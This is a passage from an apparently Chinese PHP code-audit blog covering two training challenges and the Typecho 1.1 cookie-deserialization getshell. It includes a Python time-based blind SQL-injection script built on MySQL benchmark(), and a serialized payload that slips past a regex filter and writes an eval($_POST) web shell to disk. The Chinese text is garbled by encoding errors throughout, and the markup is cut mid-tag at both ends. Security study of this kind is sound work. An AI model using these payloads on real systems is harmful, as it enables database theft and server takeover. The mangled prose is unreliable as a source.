<span class="subst">&#123;$row[&#x27;score&#x27;]&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;ä½ æ‰€æŸ¥è¯¢çš„å¯¹è±¡idå€¼ä¸èƒ½ä¸ºç©ºï¼&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;day10&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬æ¬¡é¢˜ç›®æºäºæŸCMS 0day æ¼æ´æ”¹ç¼–ã€‚å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°åœ¨ä¸Šå›¾ä»£ç  ç¬¬29è¡Œ å¤„è¿›è¡Œäº† SQL è¯­å¥æ‹¼æ¥ï¼Œç„¶åç›´æ¥å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚è€Œåœ¨å‰ä¸€è¡Œï¼Œå…¶å®æ˜¯æœ‰å¯¹ GET æ–¹å¼ä¼ æ¥çš„å‚æ•° id è¿›è¡Œè¿‡æ»¤çš„ï¼Œæˆ‘ä»¬æ¥è¯¦ç»†çœ‹çœ‹è¿‡æ»¤å‡½æ•° stophack ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ° stophack å‡½æ•°å­˜åœ¨ è¿‡æ»¤ä¸ä¸¥ å’Œ æ£€æµ‹åˆ°éæ³•å­—ç¬¦æœªç›´æ¥é€€å‡º ä¸¤ä¸ªé—®é¢˜ã€‚<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-13.png"><br>ç¨‹åºå¦‚æœæ£€æµ‹åˆ°éæ³•å­—ç¬¦æˆ–å•è¯ï¼Œéƒ½ä¼šå°†å…¶æ›¿æ¢æˆå­—ç¬¦ä¸² HongRi ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ç«‹å³é€€å‡ºï¼Œè¿™æ ·æ”»å‡»è€…è¾“å…¥çš„æ”»å‡»è¯­å¥è¿˜æ˜¯ä¼šç»§ç»­è¢«å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚åªä¸è¿‡è¿™é‡Œå…³é”®è¯éƒ½è¢«æ›¿æ¢æˆäº†å­—ç¬¦ä¸² HongRi ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™é‡Œçš„é»‘åå•ã€‚çºµè§‚æ•´ä¸ªç¨‹åºï¼Œå½“ SQL è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œå¹¶ä¸ä¼šå°†é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ï¼Œæ‰€ä»¥æ­¤å¤„åº”ä¸ºç›²æ³¨ã€‚å¼€å‘è€…ä¼°è®¡ä¹Ÿæ˜¯è€ƒè™‘åˆ°è¿™ä¸ªé—®é¢˜ï¼Œä¾¿å°†å…³é”®è¯ sleep ç»™è¿‡æ»¤äº†ï¼Œç„¶è€Œè¿™å¹¶ä¸èƒ½å½±å“æ”»å‡»è€…ç»§ç»­ä½¿ç”¨ç›²æ³¨æ¥è·å–æ•°æ®ã€‚å…³äºç¦ç”¨äº† sleep å‡½æ•°çš„ç›²æ³¨ï¼Œå¤§å®¶å¯ä»¥ç›´æ¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/2288">mysql å»¶æ—¶æ³¨å…¥æ–°æ€è·¯</a> ã€‚è¿™é‡Œæˆ‘ç›´æ¥åˆ©ç”¨ benchmark å‡½æ•°æ¥è·å–flagã€‚pythonç¨‹åºå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, string, requests</span><br><span class="line"></span><br><span class="line">version_chars = <span class="string">&quot;.-&#123;&#125;_&quot;</span> + string.ascii_letters + string.digits + <span class="string">&#x27;#&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> version_chars:</span><br><span class="line">        payload = <span class="string">&quot;-1 or if(ascii(mid((select flag from flag),%s,1))=%s,benchmark(200000000,7^3^8),0)&quot;</span> % (i,<span class="built_in">ord</span>(char))</span><br><span class="line">        url = <span class="string">&quot;http://localhost/index.php?id=%s&quot;</span> % payload</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                sys.stdout.write(<span class="string">&quot;\n[+] The flag isï¼š %s&quot;</span> % flag)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Something run error!&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url, timeout=<span class="number">2.0</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flag += char</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\r[-] Try to get flagï¼š %s&quot;</span> % flag)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-] Something run error!&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cacheFile</span> = <span class="string">&#x27;/tmp/cachefile&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$template</span> = <span class="string">&#x27;&lt;div&gt;Welcome back %s&lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadData</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">&#x27;O:&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/O:\d:/&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span>(<span class="params"><span class="variable">$file</span> = <span class="literal">null</span>, <span class="variable">$tpl</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$file</span> ?? <span class="variable language_">$this</span>-&gt;cacheFile;</span><br><span class="line">        <span class="variable">$tpl</span> = <span class="variable">$tpl</span> ?? <span class="variable language_">$this</span>-&gt;template;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$tpl</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$this</span>-&gt;template, <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createCache</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Template</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>é¢˜ç›®è€ƒå¯Ÿå¯¹phpååºåˆ—åŒ–å‡½æ•°çš„åˆ©ç”¨ã€‚åœ¨ç¬¬10è¡Œ <strong>loadData()</strong> å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº† <strong>unserialize</strong> å‡½æ•°å¯¹ä¼ å…¥çš„ <strong>$data</strong> å˜é‡è¿›è¡Œäº†ååºåˆ—ã€‚åœ¨ååºåˆ—åŒ–å‰ï¼Œå¯¹å˜é‡å†…å®¹è¿›è¡Œäº†åˆ¤æ–­ï¼Œå…ˆä¸è€ƒè™‘ç»•è¿‡ï¼Œè·Ÿè¸ªä¸€ä¸‹å˜é‡ï¼Œçœ‹çœ‹å˜é‡æ˜¯å¦å¯æ§ã€‚åœ¨ä»£ç  <strong>ç¬¬6è¡Œ</strong> ï¼Œè°ƒç”¨äº† <strong>loadData()</strong> å‡½æ•°ï¼Œ<code>$data</code>å˜é‡æ¥è‡ªäº <strong>__construct()</strong> æ„é€ å‡½æ•°ä¼ å…¥çš„å˜é‡ã€‚ä»£ç ç¬¬32è¡Œï¼Œå¯¹ <strong>Template</strong> ç±»è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œå¹¶å°† <strong>cookie</strong> ä¸­é”®ä¸ºâ€™dataâ€™æ•°æ®ä½œä¸ºåˆå§‹åŒ–æ•°æ®è¿›è¡Œä¼ å…¥ï¼Œ<code>$data</code>æ•°æ®æˆ‘ä»¬å¯æ§ã€‚å¼€å§‹è€ƒè™‘ç»•è¿‡å¯¹ä¼ å…¥æ•°æ®çš„åˆ¤æ–­ã€‚</p><p>ä»£ç  <strong>11è¡Œ</strong> ï¼Œç¬¬ä¸€ä¸ªifï¼Œæˆªå–å‰ä¸¤ä¸ªå­—ç¬¦ï¼Œåˆ¤æ–­ååºåˆ—åŒ–å†…å®¹æ˜¯å¦ä¸ºå¯¹è±¡ï¼Œå¦‚æœä¸ºå¯¹è±¡ï¼Œè¿”å›ä¸ºç©ºã€‚phpå¯ååºåˆ—åŒ–ç±»å‹æœ‰String,Integer,Boolean,Null,Array,Objectã€‚å»é™¤æ‰Objectåï¼Œè€ƒè™‘é‡‡ç”¨æ•°ç»„ä¸­å­˜å‚¨å¯¹è±¡è¿›è¡Œç»•è¿‡ã€‚</p><p>ç¬¬äºŒä¸ªifåˆ¤æ–­,åŒ¹é… å­—ç¬¦ä¸²ä¸º &#39;O:ä»»æ„åè¿›åˆ¶:â€™,å°†å¯¹è±¡æ”¾å…¥æ•°ç»„è¿›è¡Œååºåˆ—åŒ–åï¼Œä»ç„¶èƒ½å¤ŸåŒ¹é…åˆ°ï¼Œè¿”å›ä¸ºç©ºï¼Œè€ƒè™‘ä¸€ä¸‹å¦‚ä½•ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼ŒPHPååºåˆ—åŒ–å¤„ç†éƒ¨åˆ†æºç å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-14.png"></p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-15.png"></p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-16.png"></p><p>åœ¨PHPæºç var_unserializer.cï¼Œå¯¹ååºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œåœ¨ä»£ç 568è¡Œå¯¹å­—ç¬¦è¿›è¡Œåˆ¤æ–­ï¼Œå¹¶è°ƒç”¨ç›¸åº”çš„å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œå½“å­—ç¬¦ä¸ºâ€™Oâ€™æ—¶ï¼Œè°ƒç”¨ <strong>yy13</strong> å‡½æ•°ï¼Œåœ¨ <strong>yy13</strong> å‡½æ•°ä¸­ï¼Œå¯¹â€˜Oâ€˜å­—ç¬¦çš„ä¸‹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ˜¯â€™:â€™,åˆ™è°ƒç”¨ <strong>yy17</strong> å‡½æ•°,å¦‚æœä¸æ˜¯åˆ™è°ƒç”¨ <strong>yy3</strong> å‡½æ•°,ç›´æ¥return 0ï¼Œç»“æŸååºåˆ—åŒ–ã€‚æ¥ç€çœ‹ <strong>yy17</strong> å‡½æ•°ã€‚é€šè¿‡è§‚å¯Ÿyybm[]æ•°ç»„å¯çŸ¥ï¼Œç¬¬ä¸€ä¸ªifåˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¦‚æœä¸ºæ•°å­—åˆ™è·³è½¬åˆ° <strong>yy20</strong> å‡½æ•°ï¼Œç¬¬äºŒä¸ªåˆ¤æ–­å¦‚æœæ˜¯â€™+â€™å·åˆ™è·³è½¬åˆ° <strong>yy19</strong> ï¼Œåœ¨ <strong>yy19</strong> ä¸­ï¼Œç»§ç»­å¯¹ <strong>+å·</strong> åé¢çš„å­—ç¬¦è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸ºæ•°å­—åˆ™è·³è½¬åˆ° <strong>yy20</strong> ,å¦‚æœä¸æ˜¯åˆ™è·³è½¬åˆ° <strong>yy18</strong> ï¼Œ <strong>y18</strong> æœ€ç»ˆè·³è½¬åˆ° <strong>yy3</strong> ï¼Œé€€å‡ºååºåˆ—åŒ–æµç¨‹ã€‚ç”±æ­¤ï¼Œåœ¨â€™O:â€™,åé¢å¯ä»¥å¢åŠ â€™+â€™ï¼Œç”¨æ¥ç»•è¿‡æ­£åˆ™åˆ¤æ–­ã€‚</p><p>ç»•è¿‡äº†è¿‡æ»¤ä»¥åï¼Œæ¥ä¸‹æ¥è€ƒè™‘æ€æ ·å¯¹ååºåˆ—åŒ–è¿›è¡Œåˆ©ç”¨ï¼Œååºåˆ—åŒ–æœ¬è´¨æ˜¯å°†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸæˆå¯¹åº”çš„ç±»å®ä¾‹ï¼Œåœ¨è¯¥è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯æ§çš„æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”ç±»ä¸­å˜é‡çš„å€¼ã€‚æˆ‘ä»¬æ— æ³•ç›´æ¥è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ï¼Œä½†PHPåœ¨æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ä¸‹ï¼Œä¼šè‡ªåŠ¨è§¦å‘ä¸€äº›å‡½æ•°çš„è°ƒç”¨ï¼Œè¯¥ç±»å‡½æ•°ï¼Œæˆ‘ä»¬ç§°ä¸ºé­”æœ¯æ–¹æ³•ã€‚é€šè¿‡å¯æ§çš„ç±»å˜é‡ï¼Œè§¦å‘è‡ªåŠ¨è°ƒç”¨çš„é­”æœ¯æ–¹æ³•ï¼Œä»¥åŠé­”æœ¯æ–¹æ³•ä¸­å­˜åœ¨çš„å¯åˆ©ç”¨ç‚¹ï¼Œè¿›è€Œå½¢æˆååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚</p><p>åœ¨ä»£ç 31è¡Œï¼Œå¯¹è±¡é”€æ¯æ—¶ä¼šè°ƒç”¨ <strong>createCache()</strong> å‡½æ•°ï¼Œå‡½æ•°å°† <code>$template</code> ä¸­çš„å†…å®¹æ”¾åˆ°äº† <code>$cacheFile</code> å¯¹åº”çš„æ–‡ä»¶ä¸­ã€‚ <strong>file_put_contents()</strong> å‡½æ•°ï¼Œå½“æ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼Œä¼šåˆ›å»ºè¯¥æ–‡ä»¶ã€‚ç”±æ­¤å¯æ„é€ ä¸€å¥è¯ï¼Œå†™å…¥å½“å‰è·¯å¾„ã€‚</p><p> <code>$cacheFile</code> å’Œ <code>$template</code> ä¸ºç±»å˜é‡ï¼Œååºåˆ—åŒ–å¯æ§ï¼Œç”±æ­¤ï¼Œæ„é€ ä»¥ä¸‹ååºåˆ—åŒ–å†…å®¹ï¼Œåˆ«å¿˜äº†åŠ â€™+â€™å·</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-17.png"></p><p>æ”¾å…¥cookieéœ€è¿›è¡ŒURLç¼–ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:+<span class="number">8</span>:<span class="string">&quot;Template&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;cacheFile&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;./test.php&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;template&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[xx]);?&gt;&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶æˆåŠŸå†™å…¥ï¼š</p><h3 id="å®ä¾‹åˆ†æ-2"><a href="#å®ä¾‹åˆ†æ-2" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œé€‰å–çš„æ˜¯ <strong>Typecho-1.1</strong> ç‰ˆæœ¬ï¼Œåœ¨è¯¥ç‰ˆæœ¬ä¸­ï¼Œç”¨æˆ·å¯é€šè¿‡ååºåˆ—åŒ–Cookieæ•°æ®è¿›è¡Œå‰å°Getshellã€‚è¯¥æ¼æ´å‡ºç°äº <strong>install.php</strong> æ–‡ä»¶ <strong>230è¡Œ</strong> ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line"><span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="variable">$config</span>, <span class="title class_">Typecho_Db</span>::<span class="variable constant_">READ</span> | <span class="title class_">Typecho_Db</span>::<span class="variable constant_">WRITE</span>);</span><br><span class="line"><span class="title class_">Typecho_Db</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$db</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šå›¾ä»£ç  <strong>ç¬¬3è¡Œ</strong> ï¼Œå¯¹Cookieä¸­çš„æ•°æ®base64è§£ç ä»¥åï¼Œè¿›è¡Œäº†ååºåˆ—åŒ–æ“ä½œï¼Œè¯¥å€¼å¯æ§ï¼Œæ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ä»£ç è§¦å‘æ¡ä»¶ã€‚æ–‡ä»¶å‡ ä¸ªå…³é”®åˆ¤æ–­å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­æ˜¯å¦å·²ç»å®‰è£…</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>)</span><br><span class="line">    &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;typecho&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥å¯èƒ½çš„è·¨ç«™è¯·æ±‚</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) || !<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;<span class="subst">&#123;$parts[&#x27;host&#x27;]&#125;</span>:<span class="subst">&#123;$parts[&#x27;port&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­ï¼Œå¯é€šè¿‡GETä¼ é€’ <strong>finish&#x3D;ä»»æ„å€¼</strong> ç»•è¿‡ ï¼Œç¬¬äºŒifåˆ¤æ–­æ˜¯å¦æœ‰GETæˆ–è€…POSTä¼ å‚ï¼Œå¹¶åˆ¤æ–­Refereræ˜¯å¦ä¸ºç©ºï¼Œç¬¬å››ä¸ªifåˆ¤æ–­Refereræ˜¯å¦ä¸ºæœ¬ç«™ç‚¹ã€‚ç´§æ¥ç€è¿˜æœ‰åˆ¤æ–­ï¼Œå¦‚ä¸‹å›¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>])) : <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>)) : <span class="meta">?&gt;</span></span><br><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">title</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;å®‰è£…å¤±è´¥ï¼&#x27;); ?&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;?<span class="title">config</span>&quot; <span class="title">name</span>=&quot;<span class="title">config</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">message</span> <span class="title">error</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;æ‚¨æ²¡æœ‰ä¸Šä¼  <span class="title">config</span>.<span class="title">inc</span>.<span class="title">php</span> æ–‡ä»¶ï¼Œè¯·æ£€æŸ¥åå†è¯•ï¼&#x27;); ?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">primary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;é‡æ–°å®‰è£…&#x27;); ?&gt;&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">elseif</span> (!<span class="title">Typecho_Cookie</span>::<span class="title">get</span>(&#x27;<span class="title">__typecho_config</span>&#x27;)): ?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span class="title">title</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;å®‰è£…å®Œæˆï¼&#x27;); ?&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">typecho</span>-<span class="title">install</span>-<span 